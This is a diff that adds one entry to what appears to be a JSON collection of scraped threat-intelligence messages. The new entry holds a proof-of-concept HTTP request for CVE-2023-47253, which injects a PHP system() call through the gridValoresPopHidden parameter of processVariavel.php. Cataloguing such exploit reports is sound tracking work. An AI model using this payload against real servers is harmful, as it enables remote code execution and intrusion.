@@ -8393,6 +8393,18 @@
             "URLs": [
                 "https://github.com/navidrome/navidrome/security/advisories/GHSA-58vj-cv5w-v4v6"
             ]
+        },
+        {
+            "Message ID": 2079,
+            "Date": "2024-09-26",
+            "Content": "CVE-2023-47253\n\nGET /html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20system(\"dir\"); HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\n\ndir\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "127.0.0.1"
+            ]
         }
     ],
     "Anonymous Chat": [
